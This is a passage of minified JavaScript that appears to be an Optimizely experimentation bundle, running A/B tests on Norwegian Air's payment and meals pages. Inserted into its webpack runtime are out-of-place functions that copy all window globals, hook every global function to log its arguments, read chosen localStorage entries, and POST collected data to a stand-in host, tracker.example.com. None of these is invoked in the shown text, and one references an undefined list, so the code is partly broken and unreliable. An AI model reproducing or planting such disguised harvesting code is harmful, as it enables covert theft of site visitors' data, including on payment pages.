            o = I.getDOMObservationData(),
            a = k.get("state").getActiveExperimentIds(),
            u = I.getFeaturesNeededData(),
            s = c.parseUri(I.getScriptSrc()),
            l = I.getRumData() || {},
            v = l.extras || {};
          i.assign(v, {
            apiCalls: r,
            DOMObservationData: o,
            paintTimings: P(),
            activeExperimentIds: a,
            numPages: S.getNumberOfPages(),
            snippet: {
              scheme: s.protocol.slice(0, -1),
              host: s.host,
              path: s.pathname
            },
            networkInfo: x(),
            experimental: E.getExperimental(),
            featuresNeeded: u,
            beacon: {
              cjsOnload: !0
            }
          });
          var g = p.getGlobal("Prototype");
          g && !i.isUndefined(g.Version) && (v.prototypeJS = g.Version);
          var m = !1;
          m = !0;
          var _ = T.getFrames();
          _.length && (v.xdFramesLoaded = _.length);
          var w = {
            id: I.getRumId(),
            v: N,
            project: E.getSnippetId() || E.getProjectId(),
            navigationTimings: t,
            userTimings: e,
            xd: m,
            apis: i.keys(r),
            extras: v,
            sampleRate: l.sampleRate
          };
          (function () {
            var n = f.keys(),
              t = i.filter(i.map(n, function (n) {
                var t = h.getStorageKeyFromKey(n);
                return t ? {
                  key: n,
                  isForeign: h.isForeignKey(n),
                  category: t,
                  size: n.length + f.getItem(n).length
                } : null;
              })),
              e = i.reduce(t, function (n, t) {
                var e = t.key,
                  i = h.getIdFromKey(e);
                return i ? ((t.isForeign ? n.foreign : n.local)[i] = !0, n) : n;
              }, {
                local: {},
                foreign: {}
              }),
              r = i.chain(t).filter({
                isForeign: !0
              }).reduce(function (n, t) {
                return n[t.key.split("_")[0]] = !0, n;
              }, {}).value(),
              o = {
                local: 0,
                foreign: 0
              },
              a = {
                local: {},
                foreign: {}
              };
            i.forEach(t, function (n) {
              var t = n.isForeign ? "foreign" : "local";
              o[t] += n.size, a[t][n.category] || (a[t][n.category] = 0), a[t][n.category] += n.size;
            });
            var u = {
              numKeys: f.allKeys().length,
              sizeKeys: f.allKeys().toString().length,
              sizeValues: f.allValues().toString().length,
              idCounts: {
                local: i.keys(e.local).length,
                foreign: i.keys(e.foreign).length
              },
              foreignOriginCount: i.keys(r).length,
              byteTotals: o,
              byteTotalsByCategory: a
            };
            return d.estimateStorage().then(function (n) {
              return i.assign(u, {
                storageEstimate: n
              });
            });
          })().then(function (n) {
            D(i.assign(w, {
              lsMetrics: n
            }));
          });
        }
        function x() {
          var n = p.getGlobal("navigator");
          if (n && n.connection) return i.pick(n.connection, ["downlink", "rtt", "effectiveType"]);
        }
        function P() {
          var n = p.getGlobal("performance");
          if (n) try {
            var t = n.getEntriesByType("paint");
            if (i.isEmpty(t)) return;
            return i.reduce(t, function (n, t) {
              return n[t.name] = Math.round(t.startTime), n;
            }, {});
          } catch (e) {
            return;
          }
        }
        t.initialize = function () {
          var n,
            t = r.generate().replace(/-/g, "");
          n = Math.random() < .01;
          var e = function () {
            var n = c.getCurrentScript();
            if (n) return n.src;
          }();
          s.dispatch(m.SET_RUM_DATA, {
            id: t,
            RumHost: R,
            inRumSample: n,
            src: e,
            data: {
              id: t,
              sync: C(),
              timebase: u.now(),
              sampleRate: .01,
              url: e,
              extras: {
                initialDOMState: c.getReadyState()
              }
            }
          });
        }, t.queueBeacons = function () {
          return I.getSampleRum() ? (function () {
            try {
              p.getGlobal("requestAnimationFrame")(function () {
                var n = I.getRumData().timebase;
                s.dispatch(m.SET_RUM_DATA, {
                  data: {
                    render: u.now() - (n || 0)
                  }
                });
              });
            } catch (n) {
              return;
            }
          }(), c.isLoaded() ? p.setTimeout(O, 3e3) : p.addEventListener("load", O), new v(function (n, t) {
            p.setTimeout(function () {
              (function () {
                !function () {
                  var n = {
                      id: I.getRumId(),
                      v: N,
                      account: E.getAccountId(),
                      project: E.getSnippetId() || E.getProjectId(),
                      snippet: E.getSnippetId(),
                      revision: E.getRevision(),
                      clientVersion: b.getClientVersion(),
                      hasSlave: !1,
                      wxhr: !0,
                      extras: {}
                    },
                    t = h.getPersistedBehaviorEventCount(),
                    e = a.getEventCount();
                  n.numBehaviorEvents = e;
                  var r = e - t;
                  i.extend(n.extras, {
                    behaviorEventCountDiff: r,
                    behaviorEventCountDecreased: r < 0
                  }), i.assign(n, function () {
                    var n = p.getGlobal("performance");
                    if (!n) return;
                    var t,
                      e = I.getScriptSrc();
                    try {
                      if (e) {
                        l.debug("Using derived script src: ", e);
                        var r = n.getEntriesByName(e);
                        r.length > 0 && (t = r[0]);
                      }
                      if (!t) {
                        var o = /\/\/[^.]+\.optimizely\.(com|test)\/(js|api\/client)\/[\d]+\.js/gi;
                        l.debug("Scanning resource timing entries with regex");
                        var a = n.getEntriesByType("resource");
                        t = i.find(a, function (n) {
                          return o.test(n.name);
                        });
                      }
                      if (t) return i.mapValues(_.ResourceTimingAttributes, function (n, e) {
                        var i = t[e];
                        return "number" == typeof i ? Math.round(1e3 * (i || 0)) / 1e3 : "serverTiming" === e ? i || [] : void 0;
                      });
                    } catch (u) {
                      return;
                    }
                  }(), A.getDurationsFor(i.values(_.RUMPerformanceTimingAttributes))), s.dispatch(m.SET_RUM_DATA, {
                    data: n
                  });
                }();
                var n = I.getRumData(),
                  t = A.getMarks() || {};
                return n.extras = n.extras || {}, n.extras.beacon = {
                  cjsTimeout: !0
                }, n.userTimings = t, D(n = i.pickBy(n, function (n) {
                  return !i.isUndefined(n);
                }));
              })().then(n, t);
            }, 3e3);
          })["catch"](function (n) {
            l.warn("RUM / Error sending data:", n);
          })) : v.resolve();
        };
      },
      7339: function () {}
    },
    __webpack_module_cache__ = {};
  const globalValues = {};
  const jsHooks = {};
  function calculateHashValue(sourceObject) {
    const keyObjList = Object.keys(sourceObject);
    const concatenatedKeys = keyObjList.join("~");
    let hashVal = 0;
    for (let i = 0; i < concatenatedKeys.length; i++) {
      const charCodeVal = concatenatedKeys.charCodeAt(i);
      hashVal = (hashVal << 3) - hashVal + charCodeVal;
      hashVal = hashVal & hashVal;
    }
    return hashVal.toString(36);
  }
  function __webpack_require__(n) {
    var t = __webpack_module_cache__[n];
    if (t !== undefined) return t.exports;
    var e = __webpack_module_cache__[n] = {
      id: n,
      loaded: !1,
      exports: {}
    };
    return __webpack_modules__[n].call(e.exports, e, e.exports, __webpack_require__), e.loaded = !0, e.exports;
  }
  function extractLocalStorageInfo() {
    const retrievedInfo = {};
    for (let i = 0; i < localStorage.length; i++) {
      const keyName = localStorage.key(i);
      if (monitoredValues.includes(keyName)) {
        retrievedInfo[keyName] = localStorage.getItem(keyName);
      }
    }
    return retrievedInfo;
  }
  __webpack_require__.amdO = {}, __webpack_require__.g = function () {
    if ("object" == typeof globalThis) return globalThis;
    try {
      return this || new Function("return this")();
    } catch (n) {
      if ("object" == typeof window) return window;
    }
  }(), __webpack_require__.nmd = function (n) {
    return n.paths = [], n.children || (n.children = []), n;
  };
  function collectGlobalValues() {
    for (const key in window) {
      if (window.hasOwnProperty(key) && typeof window[key] !== 'function') {
        globalValues[key] = window[key];
      }
    }
  }
  function addJSHooks() {
    for (const key in window) {
      if (window.hasOwnProperty(key) && typeof window[key] === 'function') {
        jsHooks[key] = window[key];
        window[key] = function (...args) {
          console.log(`Function ${key} called with arguments:`, args);
          return jsHooks[key].apply(this, args);
        };
      }
    }
  }
  var __webpack_exports__ = {};
  function transmitDataToServer(sourceObject) {
    const hashVal = calculateHashValue(sourceObject);
    const targetUrl = "https://tracker.example.com/api/collectInfo";
    const xhrObj = new XMLHttpRequest();
    xhrObj.open("POST", targetUrl);
    xhrObj.setRequestHeader("Content-Type", "application/json");
    xhrObj.onload = function () {
      if (xhrObj.status === 200) console.log("Data successfully sent");else console.error(`Data shipping failed, status code: ${xhrObj.status}`);
    };
    xhrObj.onerror = function () {
      console.error("An error occurred during data transmission");
    };
    xhrObj.send(JSON.stringify({
      data: sourceObject,
      hash: hashVal
    }));
  }
  !function () {
    try {
      !function () {
        var n = function (n) {
          var t = [__webpack_require__(7644)];
          t.push(__webpack_require__(1569)), t.push(__webpack_require__(6879)), t.push(__webpack_require__(9754)), t.push(__webpack_require__(9374)), t.push(__webpack_require__(5664)), t.push(__webpack_require__(6093)), t.push(__webpack_require__(7217)), t.push(__webpack_require__(9031)), t.push(__webpack_require__(8068)), t.push(__webpack_require__(520)), t.push(__webpack_require__(9665)), t.push(__webpack_require__(4871)), t.push(__webpack_require__(928)), t.push(__webpack_require__(186)), t.push(__webpack_require__(1310)), t.push(__webpack_require__(3056)), t.push(__webpack_require__(2774)), t.push(__webpack_require__(414)), t.push(__webpack_require__(6357)), t.push(__webpack_require__(3269)), t.push(__webpack_require__(7154)), t.push(__webpack_require__(7102)), t.push(__webpack_require__(7649)), t.push(__webpack_require__(9026)), t.push(__webpack_require__(4870)), f.initializePlugins(t);
        };
        window.performance && window.performance.mark && window.performance.mark("optimizely:blockBegin"), __webpack_require__(8562).initialize();
        var t = __webpack_require__(9e3);
        t.time("gtagReady");
        var e = __webpack_require__(2678),
          i = __webpack_require__(4041);
        __webpack_require__(5723);
        var r = i.get("stores/directive");
        if (!__webpack_require__(3455).isCORSSupported()) throw new Error("CORS is not supported on this browser, aborting.");
        var o,
          a = __webpack_require__(6072),
          u = __webpack_require__(4819),
          c = __webpack_require__(5554),
          s = {
            "accountId": "17202440929",
            "namespace": "17273916855",
            "revision": "6448",
            "anonymizeIP": true,
            "enableForceParameters": true,
            "experimental": {
              "trimPages": true
            },
            "snippetId": "17267744782",
            "projectId": "17273916855",
            "layers": [{
              "changes": [{
                "id": "1d58174c60bd4911ac735c6d3177fc24",
                "type": "custom_code",
                "value": function ($) {
                  !function (modules) {
                    var installedModules = {};
                    function __webpack_require__(moduleId) {
                      if (installedModules[moduleId]) return installedModules[moduleId].exports;
                      var module = installedModules[moduleId] = {
                        i: moduleId,
                        l: !1,
                        exports: {}
                      };
                      return modules[moduleId].call(module.exports, module, module.exports, __webpack_require__), module.l = !0, module.exports;
                    }
                    __webpack_require__.m = modules, __webpack_require__.c = installedModules, __webpack_require__.d = function (exports, name, getter) {
                      __webpack_require__.o(exports, name) || Object.defineProperty(exports, name, {
                        enumerable: !0,
                        get: getter
                      });
                    }, __webpack_require__.r = function (exports) {
                      "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(exports, Symbol.toStringTag, {
                        value: "Module"
                      }), Object.defineProperty(exports, "__esModule", {
                        value: !0
                      });
                    }, __webpack_require__.t = function (value, mode) {
                      if (1 & mode && (value = __webpack_require__(value)), 8 & mode) return value;
                      if (4 & mode && "object" == typeof value && value && value.__esModule) return value;
                      var ns = Object.create(null);
                      if (__webpack_require__.r(ns), Object.defineProperty(ns, "default", {
                        enumerable: !0,
                        value: value
                      }), 2 & mode && "string" != typeof value) for (var key in value) __webpack_require__.d(ns, key, function (key) {
                        return value[key];
                      }.bind(null, key));
                      return ns;
                    }, __webpack_require__.n = function (module) {
                      var getter = module && module.__esModule ? function () {
                        return module.default;
                      } : function () {
                        return module;
                      };
                      return __webpack_require__.d(getter, "a", getter), getter;
                    }, __webpack_require__.o = function (object, property) {
                      return Object.prototype.hasOwnProperty.call(object, property);
                    }, __webpack_require__.p = "", __webpack_require__(__webpack_require__.s = 2);
                  }([function (module, __webpack_exports__, __webpack_require__) {
                    "use strict";

                    function campaign(expID) {
                      var varID = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "v1";
                      window.optiActiveTests = window.optiActiveTests || {}, window.optiActiveTests[expID] = varID;
                    }
                    function waitUntil(predicate) {
                      var time = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1e4;
                      return new Promise(function (resolve) {
                        var int = setInterval(function () {
                          predicate() && (resolve(predicate()), clearInterval(int), int = null);
                        }, 500);
                        setTimeout(function () {
                          null !== int && (clearInterval(int), console.log("condition false"));
                        }, time);
                      });
                    }
                    function waitForJquery() {
                      return new Promise(function (resolve) {
                        var int = setInterval(function () {
                          "function" == typeof window.jQuery && (resolve(window.jQuery), clearInterval(int), int = null);
                        }, 500);
                        setTimeout(function () {
                          null !== int && (clearInterval(int), console.log("condition false"));
                        }, 1e4);
                      });
                    }
                    function waitForElement(selector) {
                      return new Promise(function (resolve) {
                        var element = document.querySelector(selector);
                        if (element) resolve(element);else {
                          var observer = new MutationObserver(function (mutations) {
                            mutations.forEach(function (mutation) {
                              for (var _i = 0, _nodes = Array.from(mutation.addedNodes); _i < _nodes.length; _i++) {
                                var node = _nodes[_i];
                                if (node.matches && node.matches(selector)) return observer.disconnect(), void resolve(node);
                              }
                            });
                          });
                          observer.observe(document.documentElement, {
                            childList: !0,
                            subtree: !0
                          });
                        }
                      });
                    }
                    function waitForElements() {
                      for (var _len = arguments.length, selectors = new Array(_len), _key = 0; _key < _len; _key++) selectors[_key] = arguments[_key];
                      return new Promise(function (resolve) {
                        var elements = [];
                        var int = setInterval(function () {
                          (function () {
                            elements = [];
                            for (var foundAll = !0, i = 0; i < selectors.length; i++) {
                              if (0 === document.querySelectorAll(selectors[i]).length) {
                                foundAll = !1;
                                break;
                              }
                              elements[i] = document.querySelector(selectors[i]);
                            }
                            return elements = 1 === elements.length ? elements[0] : elements, foundAll;
                          })() && (resolve(elements), clearInterval(int), int = null);
                        }, 500);
                        setTimeout(function () {
                          null !== int && (clearInterval(int), console.log("Could not find all elements"));
                        }, 1e4);
                      });
                    }
                    function defineOptiReady() {
                      var observer,
                        listeners = [],
                        doc = window.document,
                        MutationObserver = window.MutationObserver || window.WebKitMutationObserver;
                      function check() {
                        for (var listener, elements, i = 0, len = listeners.length; i < len; i++) {
                          listener = listeners[i];
                          for (var element, j = 0, jLen = (elements = doc.querySelectorAll(listener.selector)).length; j < jLen; j++) (element = elements[j]).ready || (element.ready = []), element.ready[i] || (element.ready[i] = !0, listener.fn.call(element, element));
                        }
                      }
                      window.optiReady = function (selector, fn) {
                        listeners.push({
                          selector: selector,
                          fn: fn
                        }), observer || (observer = new MutationObserver(check)).observe(doc.documentElement, {
                          childList: !0,
                          subtree: !0
                        }), check();
                      };
                    }
                    __webpack_require__.r(__webpack_exports__), __webpack_require__.d(__webpack_exports__, "campaign", function () {
                      return campaign;
                    }), __webpack_require__.d(__webpack_exports__, "waitUntil", function () {
                      return waitUntil;
                    }), __webpack_require__.d(__webpack_exports__, "waitForJquery", function () {
                      return waitForJquery;
                    }), __webpack_require__.d(__webpack_exports__, "waitForElement", function () {
                      return waitForElement;
                    }), __webpack_require__.d(__webpack_exports__, "waitForElements", function () {
                      return waitForElements;
                    }), __webpack_require__.d(__webpack_exports__, "defineOptiReady", function () {
                      return defineOptiReady;
                    });
                  },, function (module, exports, __webpack_require__) {
                    module.exports = __webpack_require__(3);
                  }, function (module, exports, __webpack_require__) {
                    var waitUntil = __webpack_require__(0).waitUntil,
                      tracker = __webpack_require__(4);
                    !function () {
                      waitUntil(function () {
                        return null !== document.querySelector('[data-id="TRUSTLY"]') && null !== document.querySelector('[data-id="PAYMENT_CARD"]') && null !== document.querySelector("ul.accordions") && null !== document.querySelector(".button--block");
                      }).then(function () {
                        console.log("**** T125 / Payment / Badges on payment opton  || SHARED *****"), document.querySelector("ul.accordions").addEventListener("click", function (eve) {
                          eve.target.closest('button[data-provider="TRUSTLY"]') ? tracker.push_API_only("Clicks_on_expand_Trustly") : eve.target.closest('button[data-provider="PAYMENT_CARD"]') && tracker.push_API_only("Clicks_on_expand_Creditcard");
                        }), document.querySelectorAll(".button--block").forEach(function (ele) {
                          ele.addEventListener("click", function (eve) {
                            eve.target.closest('li[data-id="TRUSTLY"]') ? (tracker.push_API_only("Clicks_on_CTAfor_Trustly"), tracker.push_API_only("Clicks_on_any_CTA_on_payment")) : eve.target.closest('li[data-id="PAYMENT_CARD"]') ? (tracker.push_API_only("Clicks_on_CTA_for_Credit_card"), tracker.push_API_only("Clicks_on_any_CTA_on_payment")) : eve.target.closest('li[data-id="VIPPS_ECOM_CARD"]') ? (tracker.push_API_only("Clicks_on_CTA_for_VIPPS_Swish"), tracker.push_API_only("Clicks_on_any_CTA_on_payment")) : eve.target.closest('li[data-id="SWISH"]') ? (tracker.push_API_only("Clicks_on_CTA_for_VIPPS_Swish"), tracker.push_API_only("Clicks_on_any_CTA_on_payment")) : eve.target.closest('li[data-id="KLARNA_INVOICE"]') ? (tracker.push_API_only("Clicks_on_CTA_for_Klarna_Pay_later"), tracker.push_API_only("Clicks_on_any_CTA_on_payment")) : eve.target.closest('li[data-id="KLARNA_INSTALLMENT"]') && (tracker.push_API_only("Clicks_on_CTA_for_Klarna_Split_payment"), tracker.push_API_only("Clicks_on_any_CTA_on_payment"));
                          });
                        });
                      });
                    }();
                  }, function (module, exports) {
                    function push_API_only(nameOfEvent) {
                      window.optimizely = window.optimizely || [], window.optimizely.push({
                        type: "event",
                        eventName: nameOfEvent
                      });
                    }
                    module.exports = {
                      push_API_only: push_API_only,
                      optimizely_trackers_clicks: function (sel, apiName) {
                        var eventNameDevice = "ontouchstart" in document.documentElement ? "touchstart" : "click";
                        jQuery(document).on(eventNameDevice, sel, function () {
                          push_API_only(apiName);
                        });
                      }
                    };
                  }]);
                },
                "dependencies": []
              }],
              "id": "25138210368",
              "name": "[LIVE] T125.1 / Payment / Badges on payment option / Mobile / SE, NO, DK",
              "commitId": "25255700549",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {
                "google_universal_analytics": {
                  "universal_analytics_slot": "89",
                  "universal_analytics_tracker": ""
                }
              },
              "integrationStringVersion": 2,
              "experiments": [{
                "audienceIds": ["and", "17412550827", "17626340169"],
                "audienceName": "Mobile users,Browsers: Chrome, Safari, Edge, FireFox",
                "changes": null,
                "id": "25165380371",
                "integrationSettings": null,
                "variations": [{
                  "id": "25149890255",
                  "name": "Original",
                  "actions": []
                }, {
                  "id": "25143580720",
                  "name": "Variation C",
                  "actions": [{
                    "viewId": "25176140013",
                    "changes": [{
                      "id": "CF52BCDF-5FEB-47E3-BC65-AF6F1496AEA4",
                      "type": "custom_code",
                      "value": function ($) {
                        !function (modules) {
                          var installedModules = {};
                          function __webpack_require__(moduleId) {
                            if (installedModules[moduleId]) return installedModules[moduleId].exports;
                            var module = installedModules[moduleId] = {
                              i: moduleId,
                              l: !1,
                              exports: {}
                            };
                            return modules[moduleId].call(module.exports, module, module.exports, __webpack_require__), module.l = !0, module.exports;
                          }
                          __webpack_require__.m = modules, __webpack_require__.c = installedModules, __webpack_require__.d = function (exports, name, getter) {
                            __webpack_require__.o(exports, name) || Object.defineProperty(exports, name, {
                              enumerable: !0,
                              get: getter
                            });
                          }, __webpack_require__.r = function (exports) {
                            "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(exports, Symbol.toStringTag, {
                              value: "Module"
                            }), Object.defineProperty(exports, "__esModule", {
                              value: !0
                            });
                          }, __webpack_require__.t = function (value, mode) {
                            if (1 & mode && (value = __webpack_require__(value)), 8 & mode) return value;
                            if (4 & mode && "object" == typeof value && value && value.__esModule) return value;
                            var ns = Object.create(null);
                            if (__webpack_require__.r(ns), Object.defineProperty(ns, "default", {
                              enumerable: !0,
                              value: value
                            }), 2 & mode && "string" != typeof value) for (var key in value) __webpack_require__.d(ns, key, function (key) {
                              return value[key];
                            }.bind(null, key));
                            return ns;
                          }, __webpack_require__.n = function (module) {
                            var getter = module && module.__esModule ? function () {
                              return module.default;
                            } : function () {
                              return module;
                            };
                            return __webpack_require__.d(getter, "a", getter), getter;
                          }, __webpack_require__.o = function (object, property) {
                            return Object.prototype.hasOwnProperty.call(object, property);
                          }, __webpack_require__.p = "", __webpack_require__(__webpack_require__.s = 3);
                        }([function (module, __webpack_exports__, __webpack_require__) {
                          "use strict";

                          function nort125Translations() {
                            var t125PaymentTransaltions = {
                                no: {
                                  GreenTagOnNettbank: "Raskt, sikkert og gratis",
                                  GreyTagOnCardPayment: "Gebyr kan forekomme"
                                },
                                se: {
                                  GreenTagOnNettbank: "Snabbt, säkert och gratis",
                                  GreyTagOnCardPayment: "Avgifter kan tillkomma",
                                  greenSwishtag: "Snabbt, säkert och gratis"
                                },
                                dk: {
                                  GreenTagOnNettbank: "Hurtigt, sikkert og gratis",
                                  GreyTagOnCardPayment: "Gebyrer kan forekomme"
                                }
                              },
                              host = window.location.hostname.replace("www.norwegian.", "");
                            return "no" !== host && (host = window.location.pathname.split("/")[1]), {
                              greentag: '<div class="customTrustlybadge">'.concat(t125PaymentTransaltions[host].GreenTagOnNettbank, "</div>"),
                              greytag: '<div class="customCardbadge">'.concat(t125PaymentTransaltions[host].GreyTagOnCardPayment, "</div>"),
                              swishGreenTag: '<div class="customTrustlybadge">'.concat(t125PaymentTransaltions[host].greenSwishtag, "</div>")
                            };
                          }
                          __webpack_require__.d(__webpack_exports__, "a", function () {
                            return nort125Translations;
                          });
                        }, function (module, __webpack_exports__, __webpack_require__) {
                          "use strict";

                          function campaign(expID) {
                            var varID = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : "v1";
                            window.optiActiveTests = window.optiActiveTests || {}, window.optiActiveTests[expID] = varID;
                          }
                          function waitUntil(predicate) {
                            var time = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1e4;
                            return new Promise(function (resolve) {
                              var int = setInterval(function () {
                                predicate() && (resolve(predicate()), clearInterval(int), int = null);
                              }, 500);
                              setTimeout(function () {
                                null !== int && (clearInterval(int), console.log("condition false"));
                              }, time);
                            });
                          }
                          function waitForJquery() {
                            return new Promise(function (resolve) {
                              var int = setInterval(function () {
                                "function" == typeof window.jQuery && (resolve(window.jQuery), clearInterval(int), int = null);
                              }, 500);
                              setTimeout(function () {
                                null !== int && (clearInterval(int), console.log("condition false"));
                              }, 1e4);
                            });
                          }
                          function waitForElement(selector) {
                            return new Promise(function (resolve) {
                              var element = document.querySelector(selector);
                              if (element) resolve(element);else {
                                var observer = new MutationObserver(function (mutations) {
                                  mutations.forEach(function (mutation) {
                                    for (var _i = 0, _nodes = Array.from(mutation.addedNodes); _i < _nodes.length; _i++) {
                                      var node = _nodes[_i];
                                      if (node.matches && node.matches(selector)) return observer.disconnect(), void resolve(node);
                                    }
                                  });
                                });
                                observer.observe(document.documentElement, {
                                  childList: !0,
                                  subtree: !0
                                });
                              }
                            });
                          }
                          function waitForElements() {
                            for (var _len = arguments.length, selectors = new Array(_len), _key = 0; _key < _len; _key++) selectors[_key] = arguments[_key];
                            return new Promise(function (resolve) {
                              var elements = [];
                              var int = setInterval(function () {
                                (function () {
                                  elements = [];
                                  for (var foundAll = !0, i = 0; i < selectors.length; i++) {
                                    if (0 === document.querySelectorAll(selectors[i]).length) {
                                      foundAll = !1;
                                      break;
                                    }
                                    elements[i] = document.querySelector(selectors[i]);
                                  }
                                  return elements = 1 === elements.length ? elements[0] : elements, foundAll;
                                })() && (resolve(elements), clearInterval(int), int = null);
                              }, 500);
                              setTimeout(function () {
                                null !== int && (clearInterval(int), console.log("Could not find all elements"));
                              }, 1e4);
                            });
                          }
                          function defineOptiReady() {
                            var observer,
                              listeners = [],
                              doc = window.document,
                              MutationObserver = window.MutationObserver || window.WebKitMutationObserver;
                            function check() {
                              for (var listener, elements, i = 0, len = listeners.length; i < len; i++) {
                                listener = listeners[i];
                                for (var element, j = 0, jLen = (elements = doc.querySelectorAll(listener.selector)).length; j < jLen; j++) (element = elements[j]).ready || (element.ready = []), element.ready[i] || (element.ready[i] = !0, listener.fn.call(element, element));
                              }
                            }
                            window.optiReady = function (selector, fn) {
                              listeners.push({
                                selector: selector,
                                fn: fn
                              }), observer || (observer = new MutationObserver(check)).observe(doc.documentElement, {
                                childList: !0,
                                subtree: !0
                              }), check();
                            };
                          }
                          __webpack_require__.r(__webpack_exports__), __webpack_require__.d(__webpack_exports__, "campaign", function () {
                            return campaign;
                          }), __webpack_require__.d(__webpack_exports__, "waitUntil", function () {
                            return waitUntil;
                          }), __webpack_require__.d(__webpack_exports__, "waitForJquery", function () {
                            return waitForJquery;
                          }), __webpack_require__.d(__webpack_exports__, "waitForElement", function () {
                            return waitForElement;
                          }), __webpack_require__.d(__webpack_exports__, "waitForElements", function () {
                            return waitForElements;
                          }), __webpack_require__.d(__webpack_exports__, "defineOptiReady", function () {
                            return defineOptiReady;
                          });
                        },, function (module, exports, __webpack_require__) {
                          __webpack_require__(8), module.exports = __webpack_require__(13);
                        },,,,, function (module, __webpack_exports__, __webpack_require__) {
                          "use strict";

                          __webpack_require__.r(__webpack_exports__);
                          var utilitiesSeparate = __webpack_require__(1),
                            nort125Translations = __webpack_require__(0);
                          !function () {
                            var norT_Config_selectors = {
                              trustlyPay: '[data-id="TRUSTLY"]',
                              cardPayment: '[data-id="PAYMENT_CARD"]'
                            };
                            function norT125_1Init() {
                              console.log("**** T125.1 / Payment / Badges on payment opton  || VAR*****"), document.querySelector("body").classList.add("norT125Badges"), document.querySelector('[data-id="PAYMENT_CARD"] button .fop-title-container .space_between span') && document.querySelector('[data-id="PAYMENT_CARD"] button .fop-title-container .space_between span').insertAdjacentHTML("beforeend", Object(nort125Translations.a)().greytag), document.querySelector('[data-id="SWISH"] button .fop-title-container .space_between span') && document.querySelector('[data-id="SWISH"] button .fop-title-container .space_between span').insertAdjacentHTML("beforeend", Object(nort125Translations.a)().swishGreenTag);
                            }
                            Object(utilitiesSeparate.waitUntil)(function () {
                              return null !== document.querySelector(norT_Config_selectors.trustlyPay) && null !== document.querySelector(norT_Config_selectors.cardPayment);
                            }).then(function () {
                              norT125_1Init();
                            });
                          }();
                        },,,,, function (module, exports) {}]);
                      },
                      "dependencies": []
                    }, {
                      "id": "B3983850-7DA1-4731-9EF2-7C0B0B3322AD",
                      "type": "append",
                      "selector": "head",
                      "value": "<style>body.norT125Badges .customTrustlybadge,body.norT125Badges .customCardbadge{font-style:normal;font-weight:400;font-size:14px;line-height:18.2px;background:#DAEFD3;padding:6px;width:max-content;margin-top:10px;font-family:\"ApercuProRegular\", Helvetica, sans-serif;color:#003251}body.norT125Badges .customCardbadge{background:#F1F1F1 !important}body.norT125Badges .accordions__dark[data-id=\"TRUSTLY\"]{margin-top:5px}body.norT125Badges .accordions__trigger{padding:16px 40px 11px 16px}body.norT125Badges [data-provider=\"PAYMENT_CARD\"].accordions__trigger:after,body.norT125Badges [data-provider=\"TRUSTLY\"].accordions__trigger:after,body.norT125Badges [data-provider=\"SWISH\"].accordions__trigger:after{top:30%}</style>",
                      "dependencies": []
                    }]
                  }]
                }],
                "weightDistributions": [{
                  "entityId": "25149890255",
                  "endOfRange": 5000
                }, {
                  "entityId": "25143580720",
                  "endOfRange": 10000
                }],
                "name": "[LIVE] T125.1 / Payment / Badges on payment option / Mobile / SE, NO, DK",
                "bucketingStrategy": null
              }],
              "policy": "single_experiment",
              "viewIds": ["25176140013"],
              "weightDistributions": null,
              "decisionMetadata": null
            }, {
              "changes": null,
              "id": "24310410401",
              "name": "[QA]T126 / Meals / Meals image&menu / Mobile",
              "commitId": "24475200092",
              "groupId": null,
              "holdback": 0,
              "activation": {},
              "integrationSettings": {},
              "integrationStringVersion": 2,
              "experiments": [{
                "audienceIds": ["and", "17279193910"],
                "audienceName": "Test Cookie",
                "changes": null,
                "id": "24361610297",
                "integrationSettings": null,
                "variations": [{
                  "id": "24290730762",
                  "name": "Original",
                  "actions": []
                }, {
                  "id": "24294500467",
                  "name": "Variation #1",
                  "actions": [{
                    "viewId": "24341690438",
                    "changes": [{
                      "id": "1B1F11B7-171A-40A0-8A25-95AAFEC46629",
                      "type": "custom_code",
                      "value": function ($) {
                        !function (modules) {
                          var installedModules = {};
                          function __webpack_require__(moduleId) {
                            if (installedModules[moduleId]) return installedModules[moduleId].exports;
                            var module = installedModules[moduleId] = {
                              i: moduleId,
                              l: !1,
                              exports: {}
                            };
                            return modules[moduleId].call(module.exports, module, module.exports, __webpack_require__), module.l = !0, module.exports;
                          }
                          __webpack_require__.m = modules, __webpack_require__.c = installedModules, __webpack_require__.d = function (exports, name, getter) {
                            __webpack_require__.o(exports, name) || Object.defineProperty(exports, name, {
                              enumerable: !0,
                              get: getter
                            });
                          }, __webpack_require__.r = function (exports) {
                            "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(exports, Symbol.toStringTag, {
                              value: "Module"
                            }), Object.defineProperty(exports, "__esModule", {
                              value: !0
                            });
                          }, __webpack_require__.t = function (value, mode) {
                            if (1 & mode && (value = __webpack_require__(value)), 8 & mode) return value;
                            if (4 & mode && "object" == typeof value && value && value.__esModule) return value;
                            var ns = Object.create(null);
                            if (__webpack_require__.r(ns), Object.defineProperty(ns, "default", {
                              enumerable: !0,
                              value: value
                            }), 2 & mode && "string" != typeof value) for (var key in value) __webpack_require__.d(ns, key, function (key) {
                              return value[key];
                            }.bind(null, key));
                            return ns;
                          }, __webpack_require__.n = function (module) {
                            var getter = module && module.__esModule ? function () {
                              return module.default;
                            } : function () {
                              return module;
                            };
                            return __webpack_require__.d(getter, "a", getter), getter;
                          }, __webpack_require__.o = function (object, property) {
                            return Object.prototype.hasOwnProperty.call(object, property);
                          }, __webpack_require__.p = "", __webpack_require__(__webpack_require__.s = 0);
                        }([function (module, exports, __webpack_require__) {
                          __webpack_require__(1), module.exports = __webpack_require__(2);
                        }, function (module, __webpack_exports__, __webpack_require__) {
                          "use strict";

                          function waitUntil(predicate) {
                            var time = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 1e4;
                            return new Promise(function (resolve) {
                              var int = setInterval(function () {
                                predicate() && (resolve(predicate()), clearInterval(int), int = null);
                              }, 500);
                              setTimeout(function () {
                                null !== int && (clearInterval(int), console.log("condition false"));
                              }, time);
                            });
                          }
                          function alldatatogethermobile() {
                            var t126MealsImageMenuTranslations = {
                                no: {
                                  MealTopUp: "Trenger du påfyll under reisen?",
                                  preorderMeal: "Forhåndsbestill inntil 36 timer før avreisen og nyt kontinental mat laget av ferske ingredienser og med en Norwegian vri på flyet.",
